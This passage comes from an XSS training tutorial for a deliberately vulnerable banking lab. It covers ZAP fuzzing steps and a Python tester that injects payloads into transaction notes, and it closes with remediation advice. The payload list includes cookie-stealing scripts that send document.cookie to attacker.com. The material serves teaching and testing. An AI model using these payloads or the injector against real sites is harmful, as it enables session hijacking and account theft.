  --output-format json > zap_xss_scan.json
```

5. **Review Results**:
   - Navigate to **Alerts** tab
   - Look for "Cross Site Scripting (Reflected)" or "Cross Site Scripting (Persistent)"
   - Risk: High
   - Confidence: High (if confirmed)

#### ZAP Fuzzer for XSS

1. **Find the transaction note request** in ZAP History
2. **Right-click > Attack > Fuzz**
3. **Highlight** the note field value
4. Click **Add** and select **XSS Fuzzing** payload list
5. **Start Fuzzer**
6. Review responses:
   - **200 OK + payload reflected** = Vulnerable
   - **200 OK + payload encoded** = Protected

---

### Custom Python Script for XSS Testing

#### Complete XSS Testing Framework

```python
#!/usr/bin/env python3
"""
SecureBank XSS Vulnerability Tester
Comprehensive XSS detection and exploitation tool
"""

import requests
import json
import argparse
from urllib.parse import urljoin
from colorama import Fore, Style, init

# Initialize colorama for colored output
init(autoreset=True)

class XSSTester:
    def __init__(self, base_url, session_cookie, csrf_token=None):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        self.csrf_token = csrf_token
        
        # XSS payload library
        self.payloads = {
            'basic': [
                "<script>alert('XSS')</script>",
                "<script>alert(document.cookie)</script>",
                "<script>alert(document.domain)</script>"
            ],
            'img_tag': [
                "<img src=x onerror=alert('XSS')>",
                "<img src=x onerror=alert(document.cookie)>",
                "<img/src/onerror=alert('XSS')>"
            ],
            'svg': [
                "<svg/onload=alert('XSS')>",
                "<svg><script>alert('XSS')</script></svg>",
                "<svg/onload=alert(document.cookie)>"
            ],
            'event_handlers': [
                "<body onload=alert('XSS')>",
                "<input onfocus=alert('XSS') autofocus>",
                "<select onfocus=alert('XSS') autofocus>"
            ],
            'bypass': [
                "<ScRiPt>alert('XSS')</ScRiPt>",
                "'-alert('XSS')-'",
                "\"><script>alert('XSS')</script>",
                "javascript:alert('XSS')"
            ],
            'advanced': [
                "<script>fetch('https://attacker.com?c='+document.cookie)</script>",
                "<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>",
                "<script>document.location='https://attacker.com/phish?c='+document.cookie</script>"
            ]
        }
    
    def test_transaction_note_xss(self, api_type='red'):
        """Test XSS in transaction notes"""
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"Testing {api_type.upper()} API Transaction Notes for XSS")
        print(f"{'='*70}{Style.RESET_ALL}\n")
        
        # Create a test transaction
        transaction_id = self._create_test_transaction(api_type)
        if not transaction_id:
            print(f"{Fore.RED}Failed to create test transaction{Style.RESET_ALL}")
            return
        
        results = []
        total_tests = sum(len(payloads) for payloads in self.payloads.values())
        current_test = 0
        
        for category, payloads in self.payloads.items():
            print(f"\n{Fore.YELLOW}Testing {category} payloads...{Style.RESET_ALL}")
            
            for payload in payloads:
                current_test += 1
                print(f"[{current_test}/{total_tests}] Testing: {payload[:60]}...", end=' ')
                
                is_vulnerable = self._test_payload(transaction_id, payload, api_type)
                
                if is_vulnerable:
                    print(f"{Fore.RED}✗ VULNERABLE{Style.RESET_ALL}")
                    results.append({
                        'category': category,
                        'payload': payload,
                        'status': 'VULNERABLE'
                    })
                else:
                    print(f"{Fore.GREEN}✓ PROTECTED{Style.RESET_ALL}")
                    results.append({
                        'category': category,
                        'payload': payload,
                        'status': 'PROTECTED'
                    })
        
        # Print summary
        self._print_summary(results, api_type)
        
        return results
    
    def _create_test_transaction(self, api_type):
        """Create a test transaction and return its ID"""
        url = urljoin(self.base_url, f'/api/{api_type}/securebank/transfer')
        
        data = {
            'from_account': '1001',
            'to_account': '2001',
            'amount': 1.0,
            'description': 'XSS Test Transaction'
        }
        
        headers = {'Content-Type': 'application/json'}
        if api_type == 'blue' and self.csrf_token:
            headers['X-CSRF-Token'] = self.csrf_token
        
        try:
            response = self.session.post(url, json=data, headers=headers)
            if response.ok:
                return response.json().get('transaction_id')
        except Exception as e:
            print(f"{Fore.RED}Error creating transaction: {e}{Style.RESET_ALL}")
        
        return None
    
    def _test_payload(self, transaction_id, payload, api_type):
        """Test a single XSS payload"""
        # Inject payload
        url = urljoin(self.base_url, f'/api/{api_type}/securebank/transaction/{transaction_id}/note')
        
        headers = {'Content-Type': 'application/json'}
        if api_type == 'blue' and self.csrf_token:
            headers['X-CSRF-Token'] = self.csrf_token
        
        data = {'note': payload}
        
        try:
            response = self.session.put(url, json=data, headers=headers)
            if not response.ok:
                return False
            
            # Retrieve and check if payload is reflected without encoding
            get_url = urljoin(self.base_url, f'/api/{api_type}/securebank/transactions')
            response = self.session.get(get_url)
            
            if response.ok:
                # Check if the exact payload appears (vulnerable)
                # or if it's HTML encoded (safe)
                if payload in response.text:
                    return True  # Vulnerable
                elif payload.replace('<', '&lt;').replace('>', '&gt;') in response.text:
                    return False  # Protected (HTML encoded)
            
        except Exception as e:
            print(f"{Fore.RED}Error: {e}{Style.RESET_ALL}")
        
        return False
    
    def _print_summary(self, results, api_type):
        """Print test summary"""
        vulnerable = [r for r in results if r['status'] == 'VULNERABLE']
        protected = [r for r in results if r['status'] == 'PROTECTED']
        
        print(f"\n{Fore.CYAN}{'='*70}")
        print(f"SUMMARY - {api_type.upper()} API")
        print(f"{'='*70}{Style.RESET_ALL}")
        print(f"\nTotal tests: {len(results)}")
        print(f"{Fore.RED}Vulnerable: {len(vulnerable)}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}Protected: {len(protected)}{Style.RESET_ALL}")
        
        if vulnerable:
            print(f"\n{Fore.RED}⚠ WARNING: XSS VULNERABILITIES DETECTED!{Style.RESET_ALL}")
            print("\nVulnerable payloads:")
            for r in vulnerable:
                print(f"  - [{r['category']}] {r['payload']}")
            print(f"\n{Fore.YELLOW}Recommendation: Implement HTML entity encoding{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.GREEN}✓ All payloads were successfully blocked or encoded{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='SecureBank XSS Tester')
    parser.add_argument('--url', default='http://localhost:5000', help='Base URL')
    parser.add_argument('--session', required=True, help='Session cookie value')
    parser.add_argument('--csrf', help='CSRF token (for Blue API)')
    parser.add_argument('--api', choices=['red', 'blue', 'both'], default='both', help='API to test')
    
    args = parser.parse_args()
    
    print(f"{Fore.CYAN}")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print("║         SecureBank XSS Vulnerability Testing Framework           ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print(f"{Style.RESET_ALL}")
    
    tester = XSSTester(args.url, args.session, args.csrf)
    
    if args.api in ['red', 'both']:
        tester.test_transaction_note_xss('red')
    
    if args.api in ['blue', 'both']:
        if not args.csrf:
            print(f"\n{Fore.YELLOW}Warning: No CSRF token provided for Blue API{Style.RESET_ALL}")
        tester.test_transaction_note_xss('blue')

if __name__ == '__main__':
    main()
```

#### Running the Script

```bash
# Install dependencies
pip install requests colorama

# Test Red API (vulnerable)
python xss_tester.py --session YOUR_SESSION_COOKIE --api red

# Test Blue API (secure)
python xss_tester.py --session YOUR_SESSION_COOKIE --csrf YOUR_CSRF_TOKEN --api blue

# Test both APIs
python xss_tester.py --session YOUR_SESSION_COOKIE --csrf YOUR_CSRF_TOKEN --api both
```

#### Expected Output

```
╔═══════════════════════════════════════════════════════════════════╗
║         SecureBank XSS Vulnerability Testing Framework           ║
╚═══════════════════════════════════════════════════════════════════╝

======================================================================
Testing RED API Transaction Notes for XSS
======================================================================

Testing basic payloads...
[1/24] Testing: <script>alert('XSS')</script>... ✗ VULNERABLE
[2/24] Testing: <script>alert(document.cookie)</script>... ✗ VULNERABLE
[3/24] Testing: <script>alert(document.domain)</script>... ✗ VULNERABLE

Testing img_tag payloads...
[4/24] Testing: <img src=x onerror=alert('XSS')>... ✗ VULNERABLE
[...]

======================================================================
SUMMARY - RED API
======================================================================

Total tests: 24
Vulnerable: 24
Protected: 0

⚠ WARNING: XSS VULNERABILITIES DETECTED!

Vulnerable payloads:
  - [basic] <script>alert('XSS')</script>
  - [img_tag] <img src=x onerror=alert('XSS')>
  - [svg] <svg/onload=alert('XSS')>
  [...]

Recommendation: Implement HTML entity encoding
```

---

## Conclusion

Cross-Site Scripting (XSS) is one of the most critical vulnerabilities in web applications, especially in banking systems where financial data and user sessions are at stake. This documentation has shown you:

1. **What XSS is** and why it's devastating in financial applications
2. **How vulnerabilities exist** in real code (securebank_red_api.py)
3. **How to exploit** these vulnerabilities step-by-step
4. **How to fix them** with proper HTML entity encoding (securebank_blue_api.py)
5. **Real-world examples** with actual CVEs and financial losses
6. **Hands-on practice** with progressive difficulty exercises
7. **Professional tools** for testing and discovering XSS vulnerabilities

**Key Takeaways**:
- Never trust user input
- Always encode output (HTML entities)
- Use Content Security Policy (CSP) headers
- Implement CSRF protection
- Test thoroughly with automated tools
- Stay updated on new XSS vectors

**Remember**: The cost of prevention is always less than the cost of a breach. British Airways learned this lesson with a $230 million fine. Don't let your application be the next headline.

Happy (ethical) hacking! 🔐
